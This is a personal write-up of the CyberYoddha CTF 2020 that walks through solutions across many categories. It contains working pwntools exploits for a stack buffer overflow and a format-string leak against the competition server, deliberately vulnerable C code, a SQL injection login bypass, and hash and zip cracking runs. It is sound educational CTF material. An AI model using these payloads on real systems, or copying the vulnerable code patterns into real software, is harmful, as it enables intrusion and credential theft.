---
layout: post
title: "cyberyoddha CTF 2020 writeup"
date: 20-10-31
categories: ctf writeups
---

Author: 1pythonwriter

## Foreword

This was one of my favorite ctfs so far. The admins were kind, the challenges fun, and I had an overall great time. I spent a lot of time on this ctf, making multiple breakthroughts and steadily increasing my score. I also solved my first OSINT challenge which was especially interesting. My final rank was 89/875 as a solo player so it was a nice touch.

![categorybreakdown](/assets/finalcategorybreakdown.png)

![scoreovertime](/assets/finalscoreovertime.png)

## Misc
# Lorem Ipsum

![loremipsum](/assets/loremipsum.JPG)

If we look at the text, we notice it is slightly different from the normal lorem ipsum. If we compare the given lorem ipsum with the original (you get can a snippet from sublime text), we find that the changed chars (when put together) result in:

#### Flag: cyctf{latiniscool}.

## Forensics

# Image Viewer

![imageviewer](/assets/imageviewer.JPG)

Run strings on the image:

![imageviewerstep1](/assets/imageviewerstep1.png)

#### flag: cyctf{h3h3h3_1m@g3_M3t@d@t@_v13w3r_ICU}

# The row beneath

![the row beneath](/assets/therowbeneath.JPG)

Same as the previous challenge, we find the flag if we run strings on the image.

![therowbeneathstep1](/assets/therowbeneathstep1.png)

![therowbeneathstep2](/assets/therowbeneathstep2.png)

#### flag: cyctf{L00k_1n_th3_h3x_13h54d56}

# What's the password?

![whatsthepassword](/assets/whatsthepassword.PNG)

using steghide we find that something is hidden in the image. We extract it to get the text file with the flag. (password "sudo" - hint is in the image)

![whatsthepasswordflag](/assets/whatsthepasswordflag.png)

#### flag: CYCTF{U$3_sud0_t0_achi3v3_y0ur_dr3@m$!}

# Flag Delivery

![flag delivery](/assets/flagdelivery.PNG)

File contents are:

```
D ?M6?M6?M6?M6 ?M6D D?M6 D?M6D
D?M6DD DDD ?M6?M6D
?M6?M6D?M6 DDD ?M6D?M6
DDD ?M6D?M6 D?M6?M6 ?M6 ?M6D?M6 ?M6?M6 D?M6 DD?M6
D?M6DD ?M6 ?M6D?M6?M6 D ?M6?M6?M6 ?M6D
D?M6D D?M6D?M6 ?M6?M6 ?M6D?M6 ?M6DDDD?M6 ?M6?M6?M6
?M6?M6D?M6 ?M6D?M6?M6 ?M6D DD?M6
D?M6?M6 ?M6 ?M6D?M6?M6 ?M6?M6 ?M6?M6?M6D ?M6 ?M6D?M6 D?M6DD D?M6D?M6DD
D?M6DD DDD ?M6?M6D ?M6D?M6
?M6?M6D?M6 ?M6D?M6?M6 ?M6D DD?M6
?M6?M6 ?M6?M6?M6
D?M6D?M6 D?M6DD D?M6D?M6 D ?M6?M6D?M6  ?M6D?M6 ?M6?M6?M6DD ?M6DD?M6D?M6 D?M6?M6 ?M6?M6DD?M6D D?M6?M6?M6 ?M6?M6?M6DD D ?M6DD ?M6?M6?M6DD ?M6?M6?M6DD D?M6 ?M6?M6DD?M6D D ?M6?M6?M6?M6 ?M6?M6?M6DD ?M6?M6DD?M6D ?M6D?M6?M6 ?M6DDDD D?M6 ?M6?M6?M6DD ?M6?M6?M6  ?M6D?M6D?M6D
?M6DD ?M6
?M6?M6?M6?M6 DDD ?M6DD?M6 ?M6
D?M6DD DDD ?M6?M6D
?M6D?M6?M6 ?M6?M6 D?M6D ?M6
DDD ?M6?M6D ?M6D?M6
?M6?M6?M6 ?M6 ?M6D?M6 ?M6?M6?M6D ?M6?M6 D?M6D?M6 ?M6
?M6D D?M6 D?M6?M6
D ?M6D?M6 D?M6DD
?M6D DD?M6 ?M6D ?M6?M6 D?M6 ?M6D?M6D?M6D
```

I was stumped for quite a long time but at 3am, my sleep deprived self noticed that the scientist's name backwards was "Morse Code". Changing the Ds to - and ?M6 to . gives us the flag.

#### flag: CYCTF{R3@D_B3TW33N_TH3_L1N3S}

# Steg 2

![steg2](/assets/steg2.PNG)

With stegsolve we find the flag.

![steg2flag](/assets/steg2flag.png)

#### flag: CYCTF{l$b_st3g@n0gr@phy_f0r_th3_w1n}

## Cryptography

# Beware the ides of march

![bewaretheidesofmarch](/assets/bewareidesofmarch.JPG)

Caesar cypher challenge. Use a website like https://www.dcode.fr/caesar-cipher to solve. With a rotation of +7 we get

#### flag: CYCTF{c@3$@r_c!ph3r}

# Home Base

All we get is the following:

"4a5a57474934325a47464b54475632464f4
259474336534a4f564647595653574a35434
5533454434b52585336564a524f425556435
533554e4251574f504a35"

There are 4 bases in baseball, so it seems like this is a multi-layer crypto challenge.
Via trial and error (with cyberchef) we find the flag by first decrypting it from hex to get:

"JZWGI42ZGFKTGV2FOBYGC6SJOVFGYVSWJ5
CES4TCKRXS6VJROBUVCU3UNBQWOPJ5"

We then decrypt this from base 32 and get:

"NldsY1U3WEppazIuJlVVODIrbTo/U1piQSthag=="

which is base64 (evident by the "==" at the end). We decrypt it and get:

"6WlcU7XJik2.&UU82+m:?SZbA+aj" 

Which we then decrypt with base 85, getting the flag:

#### Flag: CYCTF{it5_@_H0m3_2un!}

# SUS

![sus](/assets/sus.PNG)

We get "ooflgqofllcedopwvtnhyacwllhehdl", using a vingenere cypher brute-forcer we get the flag.

#### flag: cyctf{wouldyoulikesomevinegarwiththat}

# Rak 1

![rak1](/assets/rak1.PNG)

Aes encryption. (hint was that it is an "advanced" encryption, AES = Advanced Encryption Standard)

Looks like aes, using cyberchef (3 parts needed are the string broken up at the :) we get the flag.

#### flag: CYCTF{wh0_kn3w_yU0_w3r3_sO_sm@r7}

## OSINT (Open-source intelligence)

# Back to the Future IV

![backtothefuture](/assets/backtothefuture.JPG)

First time doing an OSINT challenge. The title hints at going back in time/time travel so I tried searching "cyberyoddha.baycyber.net" on the wayback machine and discovered that someone had taken a snapshot on September 16, 2020.

Because the challenge talked about "points", I checked the scoreboard and found a team called "team". Clicking it, we find the flag in their "category breakdown" section.

![osintflag](/assets/backtothefutureflag.JPG)

#### flag: CYCTF{Tr@v3l_b@ck_1n_t1m3_t0_g3t_th3_fl@g}

## Binary Exploitation
# Overflow 1

![overflow1](/assets/overflow1.JPG)
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
  char str[] = "AAAA";
  char buf[16];

  gets(buf);
  
  if (!(str[0] == 'A' && str[1] == 'A' && str[2] == 'A' && str[3] == 'A')){
    system("/bin/sh");
  }
}
```
We can see that it checks if the string has been overwritten to not equal "AAAA". We can simply flood the program with "B"s or something else to overwrite it, getting the shell and therefore the flag.

![overflow1solution](/assets/overflow1solve.png)

#### flag: cyctf{st@ck_0v3rfl0ws_@r3_3z}
# Overflow 2

![overflow2](/assets/overflow2.JPG)

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void run_shell(){
	system("/bin/sh");
}

void vuln(){
	char buf[16];
	gets(buf);
}

int main(void) {
	vuln();  
}
```
We can see that to get a shell, we need to call the run_shell() function by controlling the return address. First we get the addr of the function (can be done by disassembling the program, I used: objdump -d -M intel ./Overflow2)

![get_shell_function_addr](/assets/getshelladdr.png)

Now we need to overwrite the buffer and control the return address. The buffer size to be overwritten is 28 bytes and the address (in little endian) is '\x72\x91\x04\x08'.
We can use pwntools to write an exploit:
```python
from pwn import *
context(arch="i386", os="linux")
r=remote("cyberyoddha.baycyber.net", 10002)
r.send('a'*28+'\x72\x91\x04\x08')
r.interactive()
```
We run it and..... success! We got a shell.

![overflow2exploit](/assets/overflow2exploit.png)

Running bash -a first (so we can see what commands return), we then use "ls -a" to find files and discover flag.txt which we then cat out to get the flag.
#### flag: CYCTF{0v3rfl0w!ng_v@ri@bl$_i$_3z}

# FormatS

![formatS](/assets/formatS.JPG)

The title is a big hint that this is a format string challenge. The code:
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main ()
{
	char *input;
	char *flag = "REDACTED!";

	gets(input);
	printf(input);

	return 0;
 
}
```
We can see that we control the printf function which we can use to leak values from the stack.
We run it and input "%x" 10 times.

![leakingvalues](/assets/leakingvalues.png)

With some trial and error, we determine that the 7th value is the important addr, which we can then use to leak the flag string from the stack. (via %s)
We make an exploit:
```python
from pwn import *
context(arch="i386", os="linux")
r=remote("cyberyoddha.baycyber.net", 10005)
r.send('%7$s')
r.interactive()
```

We run it and... we get the flag.

![formatStringexploit](/assets/formatstringexploit.png)

#### flag: cyctf{3xpl0!t_th3_f0rm@t_str!ng}
## Reverse Engineering
# Password 1

![password1](/assets/password1.JPG)

```python
import random

def checkPassword(password):
    if(len(password) != 43):
      return False
    if(password[26] == 'r' and 
      password[33] == 't' and 
      password[32] == '3' and 
      password[16] == '3' and 
      password[4] == 'F' and 
      password[21] == 'r' and 
      password[38] == '1' and 
      password[18] == 'c' and 
      password[22] == '@' and 
      password[31] == 'g' and 
      password[7] == 'u' and 
      password[0] == 'C' and 
      password[6] == 'p' and 
      password[39] == '3' and 
      password[3] == 'T' and 
      password[25] == '3' and 
      password[29] == 't' and 
      password[42] == '}' and 
      password[12] == 'g' and 
      password[23] == 'c' and 
      password[30] == '0' and 
      password[40] == '3' and 
      password[28] == '_' and 
      password[20] == '@' and 
      password[27] == '$' and 
      password[17] == '_' and 
      password[35] == '3' and 
      password[8] == '7' and 
      password[24] == 't' and 
      password[41] == '7' and 
      password[13] == '_' and 
      password[5] == '{' and 
      password[2] == 'C' and 
      password[11] == 'n' and 
      password[9] == '7' and 
      password[15] == 'h' and 
      password[34] == 'h' and 
      password[1] == 'Y' and 
      password[10] == '1' and 
      password[37] == '_' and 
      password[14] == 't' and 
      password[36] == 'r' and 
      password[19] == 'h'):
      return True
    return False

password = input("Enter password: ")
if(checkPassword(password)):
  print("PASSWORD ACCEPTED\n")
else:
  print("PASSWORD DENIED\n")
```

We can quite easily repurpose this code to simply print out the flag that it checks for:

```python
password=['a']*43
password[26] = 'r'
password[33] = 't'
password[32] = '3'
password[16] = '3'  
password[4] = 'F'  
password[21] = 'r' 
password[38] = '1'  
password[18] = 'c'  
password[22] = '@'  
password[31] = 'g'  
password[7] = 'u'  
password[0] = 'C'  
password[6] = 'p'  
password[39] = '3'  
password[3] = 'T'  
password[25] = '3'  
password[29] = 't'  
password[42] = '}'  
password[12] = 'g'  
password[23] = 'c'  
password[30] = '0'  
password[40] = '3'  
password[28] = '_'  
password[20] = '@'  
password[27] = '$'  
password[17] = '_'  
password[35] = '3'  
password[8] = '7'  
password[24] = 't'  
password[41] = '7'  
password[13] = '_'  
password[5] = '{'  
password[2] = 'C'  
password[11] = 'n'  
password[9] = '7'  
password[15] = 'h'  
password[34] = 'h'  
password[1] = 'Y'  
password[10] = '1'  
password[37] = '_'  
password[14] = 't'  
password[36] = 'r'  
password[19] = 'h'
print(password)
for char in password:
    print(char, end="")
```

Which prints out the flag.

#### flag: CYCTF{pu771ng_th3_ch@r@ct3r$_t0g3th3r_1337}

# Password 2

![password2](/assets/password2.JPG)

```python
import random

def checkPassword(password):
    if(len(password) != 47):
      return False
    newPass = list(password)
    for i in range(0,9):
      newPass[i] = password[i]
    for i in range(9,24):
      newPass[i] = password[32-i]
    for i in range(24,47,2):
      newPass[i] = password[70-i]
    for i in range(45,25,-2):
      newPass[i] = password[i]
    password = "".join(newPass);
    return password == "CYCTF{ju$@rcs_3l771l_@_t}bd3cfdr0y_u0t__03_0l3m"

password = input("Enter password: ")
if(checkPassword(password)):
  print("PASSWORD ACCEPTED\n")
else:
  print("PASSWORD DENIED\n")
```

Similarly to the first challenge, we can repurpose this to give us the flag:

```python
password = "CYCTF{ju$@rcs_3l771l_@_t}bd3cfdr0y_u0t__03_0l3m"
newPass = list(password)
for i in range(0,9):
    newPass[i] = password[i]
for i in range(9,24):
    newPass[i] = password[32-i]
for i in range(24,47,2):
    newPass[i] = password[70-i]
for i in range(45,25,-2):
    newPass[i] = password[i]
print(newPass)
for char in newPass:
    print(char, end='')
```

#### flag: CYCTF{ju$t_@_l177l3_scr@mbl3_f0r_y0u_t0_d3c0d3}

## Web Exploitation

# Look Closely

![lookclosely](/assets/lookclosely.JPG)

obvious inspect element challenge. We find the flag as a comment in the source code.

![inspectelement](/assets/inspectelement.PNG)

#### flag: CYCTF{1nSp3t_eL3M3nt?}

# Disallow

![disallow](/assets/disallow.JPG)

"Page I couldn't visit" is a hint referring to the robots.txt file. The subdomain "crawlies" is also a hint, referring to web crawlers (that visit robots.txt). We check it and find:

```
User-agent: *

Disallow: /n0r0b0tsh3r3/flag.html
```

We navigate to "/n0r0b0tsh3r3/flag.html" and get the flag.

#### flag: CYCTF{d33r0b0t$_r_sUp3r10r}

# Data Store

![datastore](/assets/datastore.JPG)

We visit the site and are greeted with a simple login page:

![datashoplogin](/assets/datashoplogin.PNG)

We try a simple SQL injection of: admin' OR 1=1 --. It works!

We get the 
#### flag: CYCTF{1_l0v3_$q1i}

# Something Sw33t

![somethingsw33t](/assets/smthsw33t.JPG)

Upon visiting the site, we get a cookie called "dontlookhere", seems interesting, lets look at it.

"eJyVU2tPwjAU_StLP4tsA9QR90EUxMWRQHQvNdh1d6zYDrOHZiP7746pgUhsoGna5tzTnnNvbtfoKs0YFK0R5pQVLRO4D0mK-mcnKGwg1F-j6yLOIoqlby7qP61RAClJ6HtGV_GGIQW02fz5HPVRTAmgqqqfYHixH_a5Jjuq1cXORHbtntxQY8xhn_pHuaqZB2iDLlB3-aj0HtzaASudzkQhY4P59qMucDFeJZjAESainONY4GGD6k3of9HnXJZDbbMC2Z5DvINcNKu_gwRb_AcJ925BV2mfqu1Lpf2qtLvqIflkEUjijKYKu7GG3rl5m4WmpZWebYVga4qjKhHYBnM67COwtIhwKyQ1RuKZJkh-RsnbEfUuAILfuRkCo8HY6DnqKHZtlgsM3EMM0gDnKV5AcoiFPOJc1PPLwWddE-ZNdVGnGbiodU2cpNFBfUYjKhYN3eVAJoq2Mjt3pUB4WP91utviL1X1BXD8TWE.X4ovdw.rz4sSG_k2heOMf7Cw_C6Kliw7Ms".

Seems like a flask cookie, using flask-cookie-decode (https://pypi.org/project/flask-cookie-decode/), we can decode it:

![fcd](/assets/somethingsw33tdecode.png)

We try a few of them and find the following:

![somethingsweetflag](/assets/somethingsweetflag.png)

Using cyberchef, we get the flag:

![cyberchefsw33tflag](/assets/somethingsw33tcyberchefflag.png)

#### flag: CYCTF{0K_1_see_you_maybe_you_are_smart}

# Data Store 2

![datastore2](/assets/datastore2.PNG)

Same as data store 1, we are greeted with a login page. The hint for this challenge shows us the filtering in place:
```python
def validate(username, password):
    if (username.find("'")  != -1):
        return False
    con = sqlite3.connect('acctdb.db')
    completion = False
    with con:
        cur = con.cursor()
        cur.execute("SELECT * FROM actdb WHERE username = '" + username + "' AND password = '" + password + "'")


        if cur.fetchone():
            return True
        else:
            return False
```

We can see that only the username field is being filtered, simply using
```SQL
admin' OR 1=1 --
```

in the password field will give us the flag.

#### flag: CYCTF{s@n1t1ze_@11_U$3R_1npu7$}

## Password Cracking

# secure (I think?)
![secure_i_think](/assets/secureithink.JPG)

looks like md5, use crackstation to easily find the flag: securepassword

# Crack the Zip!
![crackthezip](/assets/crackthezip.JPG)

Using fcrackzip (and rockyou.txt), we can easily bruteforce the password:

![fcrackzip](/assets/fcrackzippwordfound.png)

Using the password "not2secure", we can open the flag.txt file.

We get the 
#### flag: cyctf{y0u_cr@ck3d_th3_z1p}

# Supa Secure

![supasecure](/assets/supasecure.PNG)

It's a salted MD5 hash, with hashcat we can find the flag.

![supasecure1](/assets/supasecure1.png)

![supasecure2](/assets/supasecure2.png)

#### flag: ilovesalt

# Me, Myself, and I

![memyselfandi](/assets/memyselfandi.JPG)

```
2412f72f0f0213c98c1f9f6065728da4529000e5c3a2e16c4e1379bd3e13ccf543201eec4eb7b400eb5a6c9b774bf0c0eeda44869e08f3a54a0b13109a7644aa
```

Analyzing the hash in the TunnelsUP Hash Analyzer, we find out that it is SHA2-512. Using crackstation, we quickly find the flag: whoami

## Shebang

# Shebang 0

![shebang0](/assets/shebang0.JPG)

First we ssh to the challenge (password: shebang0): 

```bash
ssh shebang0@cyberyoddha.baycyber.net -p 1337
```

We then find files and directories with "ls -a" and finally cat the flag.

![shebang0solved](/assets/shebang0flag.png)

#### flag: CYCTF{w3ll_1_gu3$$_b@sh_1s_e@zy}

# Shebang 1

![shebang1](/assets/shebang1.JPG)

We ssh into the next challenge with the previous flag as the password:

```bash
ssh shebang1@cyberyoddha.baycyber.net -p 1337
```

To see output, we use:

```bash
bash -a
```

We pipe cat flag.txt into grep for the string "CYCTF"

```bash
cat flag.txt | grep "CYCTF"
```

We get the 
#### flag: CYCTF{w3ll_1_gu3$$_y0u_kn0w_h0w_t0_gr3p}

# Shebang 2

![shebang2](/assets/shebang2.PNG)

We find a loooooot of directories, knowing we need to find the flag, we can simply egrep for it.

![shebang2flag](/assets/shebang2flag.png)

#### flag: CYCTF{W0W_th@t$_@_l0t_0f_f1l3s}

# Shebang 3

![shebang3](/assets/shebang3.PNG)

We are greeted with 2 files, we probably have to compare them so lets use diff with --suppress-common-lines to do so.

![shebang3flag](/assets/shebang3flag.png)

#### flag: CYCTF{SPOT_TH3_D1FF}

# Shebang 4

![shebang4](/assets/shebang4.PNG)

We find flag.png but we need to open it somehow. We can transfer the flag to our host machine to do so with scp.
(for transparency, scp was, for whatever reason, not working on my machine, I talked with the (very kind) admins, and after proving my completion of the first 3 challenges (and the correct scp command), was given the flag.)

#### flag: CYCTF{W3ll_1_gu3$$_th@t_w@s_actually_easy}

## Trivia Answers

### Trivia 1 - Linus Torvalds

### Trivia 2 - Gary Kildall

### Trivia 3 - Nutch

### Trivia 4 - Honeypot

### Trivia 5 - Shoulder Surfing

### Trivia 6 - Logic Bomb

### Trivia 7 - System File Checker

### Trivia 8 - Haskell

# Final Thoughts

As mentioned before, this was a great ctf in my opinion. It didn't run for too long, the challenges were fun, and the admins were nice. I greatly enjoyed the time I spent on this ctf.

(All challenge description images were taken (via snipping tool) from cyberyoddha.baycyber.net)

